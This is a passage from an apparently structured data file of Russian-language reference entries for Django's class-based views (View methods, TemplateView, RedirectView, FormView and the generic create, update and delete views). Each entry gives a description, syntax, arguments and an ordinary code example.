        name: "*args",
        description:
          "Позиционные аргументы, извлечённые URL-резолвером из шаблона маршрута.",
      },
      {
        name: "**kwargs",
        description:
          'Именованные аргументы, извлечённые из URL-резолвера (например, параметры из path("article/<int:pk>/", ...)).',
      },
    ],
    example: `from django.views.generic import View
from django.http import JsonResponse, Http404
from .models import Article

class ArticleView(View):
    def setup(self, request, *args, **kwargs):
        super().setup(request, *args, **kwargs)
        # Загружаем объект один раз, чтобы использовать в любом методе
        try:
            self.article = Article.objects.get(pk=kwargs['pk'])
        except Article.DoesNotExist as exc:
            raise Http404('Статья не найдена') from exc

    def get(self, request, *args, **kwargs):
        return JsonResponse({'title': self.article.title})

    def delete(self, request, *args, **kwargs):
        self.article.delete()
        return JsonResponse({'deleted': True})

# urls.py
# path('article/<int:pk>/', ArticleView.as_view())`,
  },
  {
    name: "View.dispatch(request, *args, **kwargs)",
    category: "Built-in class-based views API",
    description:
      "Главный диспетчер представления: определяет HTTP-метод запроса и вызывает одноимённый метод (get, post и т. д.) на экземпляре View. Если метод не разрешён (отсутствует в http_method_names) или не реализован, делегирует обработку http_method_not_allowed. Часто переопределяется для централизованной логики: проверки прав, логирования, оборачивания в декораторы.",
    syntax: "View.dispatch(request, *args, **kwargs)",
    arguments: [
      {
        name: "request",
        description: "Объект HttpRequest текущего запроса.",
      },
      {
        name: "*args",
        description: "Позиционные аргументы из URL-резолвера.",
      },
      {
        name: "**kwargs",
        description: "Именованные аргументы из URL-резолвера.",
      },
    ],
    example: `from django.views.generic import View
from django.http import HttpResponse, HttpResponseForbidden
from django.utils.decorators import method_decorator
from django.views.decorators.cache import cache_page

class ProtectedView(View):
    def dispatch(self, request, *args, **kwargs):
        # Централизованная проверка авторизации
        if not request.user.is_authenticated:
            return HttpResponseForbidden('Войдите, чтобы продолжить')
        return super().dispatch(request, *args, **kwargs)

    def get(self, request, *args, **kwargs):
        return HttpResponse(f'Привет, {request.user.username}!')

# Декорирование dispatch — типовой способ применить декораторы view-функций
@method_decorator(cache_page(60), name='dispatch')
class CachedView(View):
    def get(self, request, *args, **kwargs):
        return HttpResponse('Кешируется на минуту')`,
  },
  {
    name: "View.http_method_not_allowed(request, *args, **kwargs)",
    category: "Built-in class-based views API",
    description:
      "Метод-обработчик, вызываемый dispatch(), когда HTTP-метод запроса не входит в http_method_names или не реализован в классе. По умолчанию возвращает HttpResponseNotAllowed (HTTP 405) с заголовком Allow, перечисляющим допустимые методы. Может быть переопределён для возврата кастомного ответа.",
    syntax: "View.http_method_not_allowed(request, *args, **kwargs)",
    arguments: [
      {
        name: "request",
        description: "Объект HttpRequest с недопустимым HTTP-методом.",
      },
      {
        name: "*args",
        description: "Позиционные аргументы из URL-резолвера.",
      },
      {
        name: "**kwargs",
        description: "Именованные аргументы из URL-резолвера.",
      },
    ],
    example: `from django.views.generic import View
from django.http import JsonResponse

class JsonOnlyAPI(View):
    http_method_names = ['get', 'post']

    def get(self, request, *args, **kwargs):
        return JsonResponse({'method': 'GET'})

    def post(self, request, *args, **kwargs):
        return JsonResponse({'method': 'POST'})

    def http_method_not_allowed(self, request, *args, **kwargs):
        # Кастомный JSON-ответ вместо стандартного HTML 405
        return JsonResponse(
            {
                'error': 'method_not_allowed',
                'method': request.method,
                'allowed': self._allowed_methods(),
            },
            status=405,
            headers={'Allow': ', '.join(self._allowed_methods())},
        )

# DELETE /api/  →  {"error": "method_not_allowed", "method": "DELETE",
#                   "allowed": ["GET", "POST", "HEAD", "OPTIONS"]}`,
  },
  {
    name: "View.options(request, *args, **kwargs)",
    category: "Built-in class-based views API",
    description:
      "Стандартный обработчик HTTP-метода OPTIONS. Возвращает пустой HttpResponse с заголовком Allow, в котором перечислены HTTP-методы, поддерживаемые данным View. Полезен для CORS-preflight-запросов и инспекции API. Может быть переопределён для добавления собственных заголовков (CORS, авторизация и пр.).",
    syntax: "View.options(request, *args, **kwargs)",
    arguments: [
      {
        name: "request",
        description: "Объект HttpRequest с методом OPTIONS.",
      },
      {
        name: "*args",
        description: "Позиционные аргументы из URL-резолвера.",
      },
      {
        name: "**kwargs",
        description: "Именованные аргументы из URL-резолвера.",
      },
    ],
    example: `from django.views.generic import View
from django.http import JsonResponse

class CORSAPIView(View):
    http_method_names = ['get', 'post', 'options']

    def get(self, request, *args, **kwargs):
        return JsonResponse({'data': 'ok'})

    def post(self, request, *args, **kwargs):
        return JsonResponse({'created': True}, status=201)

    def options(self, request, *args, **kwargs):
        # Дополняем стандартный ответ CORS-заголовками для preflight
        response = super().options(request, *args, **kwargs)
        response['Access-Control-Allow-Origin'] = '*'
        response['Access-Control-Allow-Methods'] = 'GET, POST, OPTIONS'
        response['Access-Control-Allow-Headers'] = 'Content-Type, Authorization'
        response['Access-Control-Max-Age'] = '86400'
        return response

# OPTIONS /api/  →  HTTP 200
#                   Allow: GET, POST, OPTIONS
#                   Access-Control-Allow-Origin: *`,
  },
  {
    name: "TemplateView",
    category: "Built-in class-based views API",
    description:
      "Класс django.views.generic.TemplateView — отображает HTML-шаблон с подготовленным контекстом. Самый простой generic-view, не привязанный к моделям. Использует MRO-цепочку TemplateResponseMixin → ContextMixin → View. Предназначен для статических страниц (about, contact, главная), где нужен только шаблон и, возможно, немного контекста.",
    syntax: `from django.views.generic import TemplateView

class AboutView(TemplateView):
    template_name = 'about.html'`,
    arguments: [],
    example: `# views.py
from django.views.generic import TemplateView

class HomeView(TemplateView):
    template_name = 'home.html'

    def get_context_data(self, **kwargs):
        ctx = super().get_context_data(**kwargs)
        ctx['featured_count'] = 42
        return ctx

# urls.py
from django.urls import path
from .views import HomeView

urlpatterns = [
    # Можно подключать прямо в urls.py без отдельного класса
    path('', HomeView.as_view(), name='home'),
    path('about/', TemplateView.as_view(template_name='about.html'), name='about'),
]

# templates/home.html
# <h1>Главная</h1>
# <p>Избранных статей: {{ featured_count }}</p>`,
  },
  {
    name: "TemplateView.template_name",
    category: "Built-in class-based views API",
    description:
      "Имя HTML-шаблона, который рендерит TemplateView (и любой другой класс на основе TemplateResponseMixin). Путь указывается относительно директорий, перечисленных в TEMPLATES → DIRS, и каталогов templates/ установленных приложений. Если атрибут не задан и не переопределён get_template_names(), при рендеринге выбрасывается ImproperlyConfigured.",
    syntax: 'TemplateView.template_name = "app/page.html"',
    arguments: [],
    example: `from django.views.generic import TemplateView

class ContactView(TemplateView):
    template_name = 'pages/contact.html'

# Можно задать прямо в URLconf через as_view()
# urls.py
from django.urls import path
from django.views.generic import TemplateView

urlpatterns = [
    path('privacy/', TemplateView.as_view(template_name='pages/privacy.html')),
    path('terms/',   TemplateView.as_view(template_name='pages/terms.html')),
]

# Динамический выбор шаблона — переопределить get_template_names()
class ResponsiveView(TemplateView):
    def get_template_names(self):
        if self.request.headers.get('User-Agent', '').lower().find('mobile') >= 0:
            return ['pages/home_mobile.html']
        return ['pages/home_desktop.html']`,
  },
  {
    name: "TemplateView.get_context_data(**kwargs)",
    category: "Built-in class-based views API",
    description:
      "Метод ContextMixin, формирующий словарь контекста, передаваемый в шаблон. По умолчанию включает kwargs из URL-резолвера и self.view (ссылку на сам экземпляр). Переопределяется для добавления данных в шаблон. Обязательно вызывать super().get_context_data(**kwargs), чтобы не потерять стандартные ключи.",
    syntax: "TemplateView.get_context_data(**kwargs)",
    arguments: [
      {
        name: "**kwargs",
        description:
          "Именованные аргументы — обычно содержат параметры из URL-резолвера. При переопределении передавайте их в super().get_context_data(**kwargs).",
      },
    ],
    example: `from django.views.generic import TemplateView
from .models import Article, Category

class DashboardView(TemplateView):
    template_name = 'dashboard.html'

    def get_context_data(self, **kwargs):
        # super() добавит view, request-параметры из URL и т.п.
        ctx = super().get_context_data(**kwargs)
        ctx['articles']   = Article.objects.published()[:10]
        ctx['categories'] = Category.objects.all()
        ctx['user_name']  = self.request.user.get_full_name()
        return ctx

# urls.py
# path('dashboard/', DashboardView.as_view(), name='dashboard')

# templates/dashboard.html
# <h1>Привет, {{ user_name }}!</h1>
# <ul>
#   {% for a in articles %}<li>{{ a.title }}</li>{% endfor %}
# </ul>`,
  },
  {
    name: "RedirectView",
    category: "Built-in class-based views API",
    description:
      "Класс django.views.generic.RedirectView — выполняет HTTP-редирект на заданный URL. По умолчанию использует HTTP 302 (временный редирект); для постоянного установите permanent = True (HTTP 301). Если целевой URL не найден ни через url, ни через pattern_name, ни через get_redirect_url(), возвращает HTTP 410 Gone.",
    syntax: `from django.views.generic import RedirectView

class OldUrl(RedirectView):
    url = '/new-url/'
    permanent = True`,
    arguments: [],
    example: `from django.views.generic import RedirectView

class GoToDocs(RedirectView):
    url = 'https://docs.djangoproject.com/'
    permanent = False        # HTTP 302 (по умолчанию)
    query_string = True      # пробросить ?foo=bar в редирект

class GoToProfile(RedirectView):
    pattern_name = 'profile'  # имя URL-маршрута
    permanent = False

# urls.py
from django.urls import path
from django.views.generic import RedirectView
from .views import GoToDocs, GoToProfile

urlpatterns = [
    path('docs/',  GoToDocs.as_view()),
    path('me/',    GoToProfile.as_view()),
    # Можно объявить прямо в urls.py:
    path('home/',  RedirectView.as_view(url='/', permanent=True)),
]

# Динамический редирект через get_redirect_url()
class ShortLinkView(RedirectView):
    permanent = False
    query_string = True

    def get_redirect_url(self, *args, **kwargs):
        from .models import ShortLink
        link = ShortLink.objects.get(slug=kwargs['slug'])
        return link.target_url`,
  },
  {
    name: "RedirectView.url",
    category: "Built-in class-based views API",
    description:
      "Атрибут с целевым URL для редиректа в виде готовой строки. Используется, когда адрес статичен и не зависит от параметров запроса. Поддерживает форматирование %-подстановок именованными группами из URL: значения args и kwargs текущего запроса передаются в str.format-подобном %-формате. Если нужен реверс по имени маршрута — используйте pattern_name вместо url.",
    syntax: 'RedirectView.url = "/some/path/"',
    arguments: [],
    example: `from django.views.generic import RedirectView

# Простой статичный редирект
class GoHome(RedirectView):
    url = '/'
    permanent = True   # HTTP 301

# С подстановкой параметров из URL: %(name)s
class UserRedirect(RedirectView):
    # значения kwargs из URL подставляются через %-форматирование
    url = '/profile/%(username)s/'

# urls.py
from django.urls import path
urlpatterns = [
    path('legacy-home/', GoHome.as_view()),
    # /old/users/alice/ → /profile/alice/
    path('old/users/<str:username>/', UserRedirect.as_view()),
]

# Если url = None и pattern_name тоже None — будет HTTP 410 Gone:
class GoneView(RedirectView):
    url = None`,
  },
  {
    name: "RedirectView.pattern_name",
    category: "Built-in class-based views API",
    description:
      "Имя URL-маршрута, по которому будет выполнен реверс (django.urls.reverse) для построения целевого URL редиректа. Альтернатива атрибуту url, когда адрес зависит от текущей конфигурации urls.py и должен пересчитываться. args и kwargs текущего запроса автоматически прокидываются в reverse(); если требуется иная логика — переопределите get_redirect_url().",
    syntax: 'RedirectView.pattern_name = "url-name"',
    arguments: [],
    example: `from django.views.generic import RedirectView

class GoToDashboard(RedirectView):
    pattern_name = 'dashboard'   # url(..., name='dashboard')
    permanent = False

# Передача параметров из URL текущего запроса в reverse():
class GoToArticle(RedirectView):
    # /redirect/article/42/  →  reverse('article-detail', kwargs={'pk': 42})
    pattern_name = 'article-detail'

# urls.py
from django.urls import path
from .views import ArticleDetailView, GoToDashboard, GoToArticle

urlpatterns = [
    path('dashboard/', ..., name='dashboard'),
    path('articles/<int:pk>/', ArticleDetailView.as_view(), name='article-detail'),

    path('go/dashboard/',           GoToDashboard.as_view()),
    path('redirect/article/<int:pk>/', GoToArticle.as_view()),
]

# Если url задан — он имеет приоритет над pattern_name.
# Если оба равны None — HTTP 410 Gone.`,
  },
  {
    name: "RedirectView.permanent",
    category: "Built-in class-based views API",
    description:
      "Булев атрибут, определяющий тип HTTP-редиректа. Если True — возвращается HTTP 301 Moved Permanently (постоянный редирект, кешируется браузерами и поисковыми системами); если False — HTTP 302 Found (временный). Значение по умолчанию — False, начиная с Django 1.9. Используйте True только для адресов, которые действительно изменились навсегда (миграция структуры URL, переезд на другой домен).",
    syntax: "RedirectView.permanent = False",
    arguments: [],
    example: `from django.views.generic import RedirectView

# Временный редирект (302) — по умолчанию
class TemporaryRedirect(RedirectView):
    url = '/maintenance/'
    permanent = False

# Постоянный редирект (301) — для миграции старых URL
class OldArticleUrl(RedirectView):
    pattern_name = 'article-detail'
    permanent = True       # SEO-friendly: поисковики обновят индекс

# urls.py
from django.urls import path
from django.views.generic import RedirectView

urlpatterns = [
    # /blog/<slug>/  →  301  /articles/<slug>/
    path(
        'blog/<slug:slug>/',
        RedirectView.as_view(
            pattern_name='article-detail',
            permanent=True,
        ),
    ),
    # /promo/  →  302  /landing/
    path(
        'promo/',
        RedirectView.as_view(url='/landing/', permanent=False),
    ),
]`,
  },
  {
    name: "RedirectView.query_string",
    category: "Built-in class-based views API",
    description:
      'Булев атрибут, управляющий передачей строки запроса (query string) в целевой URL редиректа. Если True — параметры из request.META["QUERY_STRING"] добавляются к итоговому URL; если False (по умолчанию) — query string отбрасывается. Полезно для UTM-меток, поисковых параметров и других данных, которые не должны теряться при редиректе.',
    syntax: "RedirectView.query_string = False",
    arguments: [],
    example: `from django.views.generic import RedirectView

# Сохраняем все query-параметры (UTM-метки, фильтры и т.п.)
class TrackedRedirect(RedirectView):
    url = '/landing/'
    query_string = True
    permanent = False

# /go/?utm_source=vk&utm_campaign=spring  →  /landing/?utm_source=vk&utm_campaign=spring

# Отбрасываем query-параметры (значение по умолчанию)
class CleanRedirect(RedirectView):
    url = '/clean/'
    query_string = False

# /go-clean/?secret=token  →  /clean/   (без ?secret=token)

# urls.py
from django.urls import path
urlpatterns = [
    path('go/',       TrackedRedirect.as_view()),
    path('go-clean/', CleanRedirect.as_view()),

    # Прямо в URLconf
    path(
        'short/<slug:slug>/',
        RedirectView.as_view(
            pattern_name='article-detail',
            query_string=True,    # пробросим ?utm_*=...
            permanent=False,
        ),
    ),
]`,
  },
  {
    name: "RedirectView.get_redirect_url(*args, **kwargs)",
    category: "Built-in class-based views API",
    description:
      "Метод, формирующий целевой URL для редиректа. Стандартная реализация: 1) если задан url — форматирует его %-подстановкой по kwargs; 2) иначе если задан pattern_name — выполняет reverse(pattern_name, args=args, kwargs=kwargs); 3) если оба None — возвращает None (что приводит к HTTP 410 Gone). При query_string=True добавляет строку запроса. Переопределяется для произвольной логики формирования URL (БД-поиск, выбор по условию).",
    syntax: "RedirectView.get_redirect_url(*args, **kwargs)",
    arguments: [
      {
        name: "*args",
        description:
          "Позиционные аргументы из URL-резолвера. Передаются в reverse() при использовании pattern_name.",
      },
      {
        name: "**kwargs",
        description:
          "Именованные аргументы из URL-резолвера. Используются для %-подстановки в url или для reverse() с pattern_name.",
      },
    ],
    example: `from django.views.generic import RedirectView
from django.shortcuts import get_object_or_404
from .models import ShortLink, Article

# Динамический редирект: тянем целевой URL из БД
class ShortLinkRedirect(RedirectView):
    permanent = False
    query_string = True

    def get_redirect_url(self, *args, **kwargs):
        link = get_object_or_404(ShortLink, slug=kwargs['slug'])
        link.click_count += 1
        link.save(update_fields=['click_count'])
        return link.target_url

# Условный редирект: разные адреса для разных пользователей
class SmartHomeRedirect(RedirectView):
    permanent = False

    def get_redirect_url(self, *args, **kwargs):
        user = self.request.user
        if not user.is_authenticated:
            return '/login/'
        if user.is_staff:
            return '/admin/'
        return super().get_redirect_url(*args, **kwargs)  # fallback на self.url

    url = '/dashboard/'

# Возврат None → HTTP 410 Gone (страница безвозвратно удалена)
class GoneArticle(RedirectView):
    def get_redirect_url(self, *args, **kwargs):
        if Article.objects.filter(slug=kwargs['slug']).exists():
            return f'/articles/{kwargs["slug"]}/'
        return None

# urls.py
# path('s/<slug:slug>/',       ShortLinkRedirect.as_view())
# path('home/',                 SmartHomeRedirect.as_view())
# path('legacy/<slug:slug>/',   GoneArticle.as_view())`,
  },
  {
    name: "FormView",
    category: "Built-in class-based views API",
    description:
      "Класс django.views.generic.edit.FormView — отображает HTML-форму, обрабатывает её отправку и валидацию, без привязки к модели. Удобен для контактных форм, поиска, фильтров и любых форм, где не создаётся/изменяется объект БД. На GET рендерит шаблон с form, на POST вызывает form_valid() при успешной валидации либо form_invalid() при ошибках.",
    syntax: `from django.views.generic.edit import FormView

class ContactView(FormView):
    template_name = 'contact.html'
    form_class = ContactForm
    success_url = '/thanks/'

    def form_valid(self, form):
        # обработать данные
        return super().form_valid(form)`,
    arguments: [],
    example: `# forms.py
from django import forms

class ContactForm(forms.Form):
    name    = forms.CharField(max_length=100)
    email   = forms.EmailField()
    message = forms.CharField(widget=forms.Textarea)

# views.py
from django.urls import reverse_lazy
from django.views.generic.edit import FormView
from django.core.mail import send_mail
from .forms import ContactForm

class ContactView(FormView):
    template_name = 'contact/form.html'
    form_class = ContactForm
    success_url = reverse_lazy('contact-thanks')   # куда редиректить после POST

    def form_valid(self, form):
        # form.cleaned_data доступен после успешной валидации
        send_mail(
            subject=f'Обращение от {form.cleaned_data["name"]}',
            message=form.cleaned_data['message'],
            from_email=form.cleaned_data['email'],
            recipient_list=['support@example.com'],
        )
        return super().form_valid(form)   # выполнит редирект на success_url

    def form_invalid(self, form):
        # вызывается при ошибке валидации; рендерит ту же страницу с form.errors
        return super().form_invalid(form)

# urls.py
# path('contact/',        ContactView.as_view(),               name='contact')
# path('contact/thanks/', TemplateView.as_view(...),          name='contact-thanks')

# templates/contact/form.html
# <form method="post">{% csrf_token %}{{ form.as_p }}<button>Отправить</button></form>`,
  },
  {
    name: "BaseFormView",
    category: "Built-in class-based views API",
    description:
      "Базовый класс django.views.generic.edit.BaseFormView — реализует логику обработки HTML-формы (GET/POST, form_valid, form_invalid) без миксина рендеринга шаблона (TemplateResponseMixin). Используется как фундамент для собственных представлений, которые возвращают не HTML, а JSON, XML, файлы и т. п. Прямой родитель FormView (= BaseFormView + TemplateResponseMixin).",
    syntax: `from django.views.generic.edit import BaseFormView

class JsonFormView(BaseFormView):
    form_class = MyForm
    def form_valid(self, form):
        ...
        return JsonResponse({'ok': True})`,
    arguments: [],
    example: `# JSON-only API endpoint на основе формы — без шаблона
from django.http import JsonResponse
from django.views.generic.edit import BaseFormView
from django import forms

class SubscribeForm(forms.Form):
    email = forms.EmailField()

class SubscribeAPIView(BaseFormView):
    form_class = SubscribeForm
    http_method_names = ['post', 'options']

    def form_valid(self, form):
        # сохраняем подписку и возвращаем JSON
        Subscriber.objects.get_or_create(email=form.cleaned_data['email'])
        return JsonResponse({'status': 'ok'}, status=201)

    def form_invalid(self, form):
        return JsonResponse(
            {'status': 'error', 'errors': form.errors},
            status=400,
        )

# urls.py
# path('api/subscribe/', SubscribeAPIView.as_view())

# Чем отличается от FormView:
#   FormView      = BaseFormView + TemplateResponseMixin   (рендерит template_name на GET и form_invalid)
#   BaseFormView  = ProcessFormView + FormMixin            (без рендеринга шаблона)`,
  },
  {
    name: "CreateView",
    category: "Built-in class-based views API",
    description:
      "Класс django.views.generic.edit.CreateView — отображает форму для создания нового объекта модели и сохраняет его в БД при успешной валидации. Автоматически строит ModelForm на основе model + fields (или принимает явный form_class). После сохранения редиректит на get_absolute_url() созданного объекта или на success_url.",
    syntax: `from django.views.generic.edit import CreateView

class ArticleCreate(CreateView):
    model = Article
    fields = ['title', 'body']`,
    arguments: [],
    example: `# views.py
from django.urls import reverse_lazy
from django.views.generic.edit import CreateView
from django.contrib.auth.mixins import LoginRequiredMixin
from .models import Article

class ArticleCreate(LoginRequiredMixin, CreateView):
    model = Article
    fields = ['title', 'slug', 'body', 'category']
    template_name = 'articles/article_form.html'  # по умолчанию: <app>/<model>_form.html
    success_url = reverse_lazy('article-list')    # либо вернёт object.get_absolute_url()

    def form_valid(self, form):
        # Установить автора до сохранения
        form.instance.author = self.request.user
        return super().form_valid(form)

# Альтернатива через form_class
from django import forms
class ArticleForm(forms.ModelForm):
    class Meta:
        model = Article
        fields = ['title', 'slug', 'body']

class ArticleCreate2(CreateView):
    form_class = ArticleForm
    template_name = 'articles/article_form.html'

# urls.py
# path('articles/new/', ArticleCreate.as_view(), name='article-create')`,
  },
  {
    name: "BaseCreateView",
    category: "Built-in class-based views API",
    description:
      "Базовый класс django.views.generic.edit.BaseCreateView — реализует логику создания нового объекта модели через форму (GET формы / POST валидации и сохранения) без миксина рендеринга шаблона. Прямой родитель CreateView (= BaseCreateView + TemplateResponseMixin). Используется для возврата нестандартных ответов: JSON, файлов, редиректов на внешние URL.",
    syntax: `from django.views.generic.edit import BaseCreateView

class ApiCreateView(BaseCreateView):
    model = Article
    fields = ['title', 'body']
    def form_valid(self, form):
        ...`,
    arguments: [],
    example: `# JSON-эндпоинт создания записи без HTML-шаблона
from django.http import JsonResponse
from django.views.generic.edit import BaseCreateView
from .models import Comment

class CommentCreateAPI(BaseCreateView):
    model = Comment
    fields = ['post', 'text']
    http_method_names = ['post']     # не нужен GET-рендеринг формы

    def form_valid(self, form):
        form.instance.author = self.request.user
        self.object = form.save()
        return JsonResponse(
            {'id': self.object.pk, 'created_at': self.object.created_at.isoformat()},
            status=201,
        )

    def form_invalid(self, form):
        return JsonResponse({'errors': form.errors}, status=400)

# urls.py
# path('api/comments/', CommentCreateAPI.as_view())

# CreateView      = BaseCreateView + TemplateResponseMixin
# BaseCreateView  = ModelFormMixin + ProcessFormView (без шаблонов)`,
  },
  {
    name: "UpdateView",
    category: "Built-in class-based views API",
    description:
      "Класс django.views.generic.edit.UpdateView — отображает форму для редактирования существующего объекта модели и сохраняет изменения в БД. Объект загружается через SingleObjectMixin (по pk или slug из URL). Шаблон по умолчанию — <app>/<model>_form.html (тот же, что и у CreateView). После сохранения редиректит на get_absolute_url() или success_url.",
    syntax: `from django.views.generic.edit import UpdateView

class ArticleUpdate(UpdateView):
    model = Article
    fields = ['title', 'body']`,
    arguments: [],
    example: `# views.py
from django.urls import reverse_lazy
from django.views.generic.edit import UpdateView
from django.contrib.auth.mixins import LoginRequiredMixin, UserPassesTestMixin
from .models import Article

class ArticleUpdate(LoginRequiredMixin, UserPassesTestMixin, UpdateView):
    model = Article
    fields = ['title', 'body', 'category']
    template_name = 'articles/article_form.html'
    # success_url не задан — будет редирект на article.get_absolute_url()

    def test_func(self):
        # Редактировать может только автор статьи
        return self.get_object().author == self.request.user

    def form_valid(self, form):
        form.instance.updated_by = self.request.user
        return super().form_valid(form)

# urls.py
# path('articles/<slug:slug>/edit/', ArticleUpdate.as_view(), name='article-update')

# В шаблоне форма уже заполнена текущими значениями объекта:
# <form method="post">{% csrf_token %}{{ form.as_p }}<button>Сохранить</button></form>`,
  },
  {
    name: "BaseUpdateView",
    category: "Built-in class-based views API",
    description:
      "Базовый класс django.views.generic.edit.BaseUpdateView — реализует логику редактирования существующего объекта через форму без миксина рендеринга шаблона. Прямой родитель UpdateView (= BaseUpdateView + TemplateResponseMixin). Используется для API-эндпоинтов и других нестандартных ответов.",
    syntax: `from django.views.generic.edit import BaseUpdateView

class ApiUpdateView(BaseUpdateView):
    model = Article
    fields = ['title', 'body']
    def form_valid(self, form):
        ...`,
    arguments: [],
    example: `from django.http import JsonResponse
from django.views.generic.edit import BaseUpdateView
from .models import Profile

class ProfileUpdateAPI(BaseUpdateView):
    model = Profile
    fields = ['bio', 'avatar']
    http_method_names = ['post', 'put', 'patch']

    def get_object(self, queryset=None):
        # Редактируется профиль текущего пользователя
        return self.request.user.profile

    def form_valid(self, form):
        self.object = form.save()
        return JsonResponse(
            {'id': self.object.pk, 'bio': self.object.bio},
            status=200,
        )

    def form_invalid(self, form):
        return JsonResponse({'errors': form.errors}, status=400)

# urls.py
# path('api/profile/', ProfileUpdateAPI.as_view())

# UpdateView      = BaseUpdateView + TemplateResponseMixin
# BaseUpdateView  = ModelFormMixin + ProcessFormView (без шаблонов)`,
  },
  {
    name: "DeleteView",
    category: "Built-in class-based views API",
    description:
      "Класс django.views.generic.edit.DeleteView — отображает страницу подтверждения удаления объекта (GET) и удаляет объект из БД при отправке формы (POST). Шаблон по умолчанию — <app>/<model>_confirm_delete.html. После удаления редиректит на success_url (атрибут обязателен, либо переопределите get_success_url()).",
    syntax: `from django.views.generic.edit import DeleteView

class ArticleDelete(DeleteView):
    model = Article
    success_url = reverse_lazy('article-list')`,
    arguments: [],
    example: `# views.py
from django.urls import reverse_lazy
from django.views.generic.edit import DeleteView
from django.contrib.auth.mixins import LoginRequiredMixin, UserPassesTestMixin
from django.contrib import messages
from .models import Article

class ArticleDelete(LoginRequiredMixin, UserPassesTestMixin, DeleteView):
    model = Article
    template_name = 'articles/article_confirm_delete.html'
    success_url = reverse_lazy('article-list')

    def test_func(self):
        # Удалять может только автор
        return self.get_object().author == self.request.user

    def form_valid(self, form):
        # Хук, добавленный в Django 4.0 — выполняется до удаления
        messages.success(self.request, f'Статья "{self.object.title}" удалена')
        return super().form_valid(form)

# urls.py
# path('articles/<slug:slug>/delete/', ArticleDelete.as_view(), name='article-delete')

# templates/articles/article_confirm_delete.html
# <form method="post">{% csrf_token %}
#   <p>Удалить статью «{{ object.title }}»?</p>
#   <button type="submit">Да, удалить</button>
#   <a href="{{ object.get_absolute_url }}">Отмена</a>
# </form>`,
  },
  {
    name: "BaseDeleteView",
    category: "Built-in class-based views API",
    description:
      "Базовый класс django.views.generic.edit.BaseDeleteView — реализует логику удаления объекта (GET для контекста, POST для удаления) без миксина рендеринга шаблона. Прямой родитель DeleteView (= BaseDeleteView + TemplateResponseMixin). Используется для DELETE-эндпоинтов API и других нестандартных ответов.",
    syntax: `from django.views.generic.edit import BaseDeleteView

class ApiDeleteView(BaseDeleteView):
    model = Article
    success_url = '/articles/'`,
    arguments: [],
    example: `from django.http import JsonResponse
from django.views.generic.edit import BaseDeleteView
from .models import Comment

class CommentDeleteAPI(BaseDeleteView):
    model = Comment
    http_method_names = ['post', 'delete']
    success_url = '/'   # обязателен, но мы вернём JSON, а не редирект

    def get_queryset(self):
        # Удалять можно только свои комментарии
        return super().get_queryset().filter(author=self.request.user)

    def form_valid(self, form):
        # Перехватываем — не редиректим, а отдаём JSON
        self.object = self.get_object()
        pk = self.object.pk
        self.object.delete()
        return JsonResponse({'deleted': True, 'id': pk}, status=200)

# urls.py
# path('api/comments/<int:pk>/', CommentDeleteAPI.as_view())

# DeleteView      = BaseDeleteView + TemplateResponseMixin
# BaseDeleteView  = DeletionMixin + FormMixin + BaseDetailView (без шаблонов)`,
  },
  {
    name: "FormView.template_name",
    category: "Built-in class-based views API",
    description:
      "Имя HTML-шаблона, который рендерится для отображения формы (на GET-запросе и при form_invalid). У FormView не имеет значения по умолчанию — атрибут обязательно должен быть задан явно (либо через get_template_names()), иначе при первом запросе будет выброшено ImproperlyConfigured. Путь указывается относительно директорий шаблонов проекта.",
    syntax: 'FormView.template_name = "app/form.html"',
    arguments: [],
    example: `from django import forms
from django.views.generic.edit import FormView

class FeedbackForm(forms.Form):
    subject = forms.CharField(max_length=200)
    body    = forms.CharField(widget=forms.Textarea)

class FeedbackView(FormView):
    template_name = 'feedback/form.html'   # обязательно
    form_class = FeedbackForm
    success_url = '/feedback/sent/'

# Динамический выбор шаблона — переопределение get_template_names()
class ResponsiveFeedbackView(FeedbackView):
    def get_template_names(self):
        if self.request.headers.get('HX-Request'):  # HTMX-запрос
            return ['feedback/_form_partial.html']
        return ['feedback/form.html']

# templates/feedback/form.html
# <form method="post">
#   {% csrf_token %}
#   {{ form.as_p }}
#   <button>Отправить</button>
# </form>`,
  },
  {
    name: "FormView.form_class",
    category: "Built-in class-based views API",
    description:
      "Класс формы (наследник django.forms.Form или ModelForm), экземпляры которого создаются для отображения и валидации. Передаётся в шаблон как переменная form. Является основным способом конфигурирования FormView; для сложных случаев можно переопределить get_form_class(), чтобы выбирать класс формы динамически (на основе пользователя, параметров запроса и т. п.).",
    syntax: "FormView.form_class = MyForm",
    arguments: [],
    example: `# forms.py
from django import forms

class LoginForm(forms.Form):
    username = forms.CharField()
    password = forms.CharField(widget=forms.PasswordInput)

class AdminLoginForm(LoginForm):
    otp_code = forms.CharField(label='OTP-код', max_length=6)

# views.py
from django.views.generic.edit import FormView
from .forms import LoginForm, AdminLoginForm

class LoginView(FormView):
    template_name = 'auth/login.html'
    form_class = LoginForm
    success_url = '/'

# Динамический выбор формы — get_form_class()
class SmartLoginView(FormView):
    template_name = 'auth/login.html'
    success_url = '/'

    def get_form_class(self):
        # Для admin-секции — расширенная форма с OTP
        if self.request.path.startswith('/admin/'):
            return AdminLoginForm
        return LoginForm

# Передача дополнительных kwargs в форму — get_form_kwargs()
class UserAwareFormView(FormView):
    template_name = 'profile/edit.html'
    form_class = LoginForm

    def get_form_kwargs(self):
        kwargs = super().get_form_kwargs()
        kwargs['user'] = self.request.user   # форма должна принимать user в __init__
        return kwargs`,
  },
  {
    name: "FormView.success_url",
    category: "Built-in class-based views API",
    description:
      'URL, на который выполняется HTTP-редирект после успешной обработки формы (form_valid). Можно указать строкой ("/thanks/") или, что предпочтительнее, через reverse_lazy("name") — ленивая версия reverse, чтобы избежать циклических импортов при загрузке URLconf. Если success_url содержит %-подстановки вида %(field)s, они заменяются значениями из self.object.__dict__ (актуально для CreateView/UpdateView). Альтернатива — переопределить get_success_url() для произвольной логики.',
    syntax: 'FormView.success_url = reverse_lazy("name")',
    arguments: [],
    example: `from django.urls import reverse_lazy
from django.views.generic.edit import FormView
from .forms import OrderForm

class OrderFormView(FormView):
    template_name = 'orders/form.html'
    form_class = OrderForm
    # reverse_lazy — потому что URLconf на момент импорта ещё не загружен
    success_url = reverse_lazy('order-thanks')

    def form_valid(self, form):
        order = form.save_order()
        self.order = order   # сохраняем для get_success_url()
        return super().form_valid(form)

    def get_success_url(self):
        # Динамический URL на основе результатов формы
        return reverse_lazy('order-detail', kwargs={'pk': self.order.pk})

# Подстановка значений объекта (CreateView/UpdateView)
from django.views.generic.edit import CreateView
from .models import Article

class ArticleCreate(CreateView):
    model = Article
    fields = ['title', 'slug', 'body']
    # Доступ к атрибутам только что созданного объекта:
